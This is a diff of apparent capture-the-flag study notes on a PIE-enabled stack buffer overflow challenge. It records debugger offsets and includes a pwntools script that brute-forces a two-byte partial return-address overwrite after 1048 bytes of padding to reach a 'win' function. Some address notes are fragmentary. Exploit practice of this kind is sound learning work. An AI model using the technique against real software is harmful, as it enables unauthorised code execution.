@@ -43,18 +43,46 @@ proc.wait()
 ```
 
 # Level3 (PIE on)
-win_offset :: 
+win_offset :: p win
+win = 0x5608cdaa ? 310
 
 (objdump offsets)
-win_offset = 1 310
+win_offset = 1 310 #pwn.p8(0x10)
 main_offset = 1 5f4
 
 (gdb)
 b vuln = 1 371
-Breakpoint 1 (vuln) = 0x000055d43956 a 371 #changes
-b win = 0x55d43956 a 318 #changes
-b main = 0x55d43956 a 5fc #changes
+#changes
+Breakpoint 1 (vuln) = 0x00005608cdaa 8 371
+p win = 0x5608cdaa 8 310 (won't work)
+p main = 0x5608cdaa 8 5f4
+8=8
+
+p win = 0x5608cdaa 8 3 10
+Breakpoint 1 (vuln) = 0x00005608cdaa 8 3 71
+combos = 0x?3
 
 (cyclic)
-offset = 0x000055ad6ded45f1
-cyclic saved rip = 0x6b61616e6b61616d
+offset = 0x0000559815e985f1 #changes
+cyclic saved rip = 0x6b61616e6b61616d (1048)
+
+of3.py
+```
+import pwn
+
+pwn.context.terminal = ["tmux","splitw","-h"]
+#proc = pwn.gdb.debug("/challenge/stackoverflow_level3")
+#proc.send(pwn.cyclic(1264))
+
+combos = [0x03, 0x13, 0x23, 0x33, 0x43, 0x53, 0x63, 0x73, 0x83, 0x93, 0xA3, 0xB3, 0xC3, 0xD3, 0xE3, 0xF3]
+
+for c in combos:
+    proc = pwn.process("/challenge/stackoverflow_level3")
+    proc.send(b"A"*1048 + pwn.p8(0x10) + pwn.p8(c))
+    tmp = proc.recvall(.25).decode()
+    if "win" in tmp:
+        print(tmp)
+        proc.interactive()
+
+#proc.wait()
+```
